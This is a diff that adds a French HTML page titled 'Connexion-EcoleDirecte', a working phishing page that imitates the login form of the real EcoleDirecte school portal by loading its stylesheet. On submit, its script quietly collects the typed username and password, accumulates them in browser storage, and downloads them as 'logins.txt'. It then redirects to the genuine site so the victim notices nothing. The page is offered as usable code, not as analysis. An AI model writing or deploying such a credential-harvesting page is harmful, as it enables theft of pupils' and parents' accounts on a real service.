@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion-EcoleDirecte</title>
+    <link rel="stylesheet" href="https://www.ecoledirecte.com/css/style.css">
+    <style>
+        /* Ajout de styles spécifiques pour le formulaire */
+        .login-container {
+            max-width: 400px ;
+            margin: 100px auto;
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+        .login-container input {
+            width: calc(100% - 20px);
+            margin: 10px 0;
+            padding: 10px;
+            font-size: 16px;
+        }
+        .login-container button {
+            background-color: #3498db;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            font-size: 16px;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        .login-container button:hover {
+            background-color: #2980b9;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <h1>Connexion</h1>
+        <form onsubmit="saveCredentials(event)">
+            <input type="text" id="username" placeholder="Identifiant" required>
+            <input type="password" id="password" placeholder="Mot de passe" required>
+            <button type="submit">Se connecter</button>
+        </form>
+    </div>
+
+    <script>
+        function saveCredentials(event) {
+            // Empêcher la soumission par défaut du formulaire
+            event.preventDefault();
+
+            // Récupérer les valeurs des champs
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            // Format de la ligne pour le fichier texte
+            const data = `${username} : ${password}\n`;
+
+            // Vérifier si un fichier existe déjà et l'augmenter
+            let existingData = localStorage.getItem("credentials") || "";
+            localStorage.setItem("credentials", existingData + data);
+
+            // Télécharger un fichier texte contenant les informations
+            const blob = new Blob([localStorage.getItem("credentials")], { type: 'text/plain' });
+            const link = document.createElement('a');
+            link.href = URL.createObjectURL(blob);
+            link.download = 'logins.txt';
+            link.click();
+
+            // Rediriger vers ÉcoleDirecte
+            window.location.href = "https://www.ecoledirecte.com/";
+        }
+    </script>
+</body>
+</html>
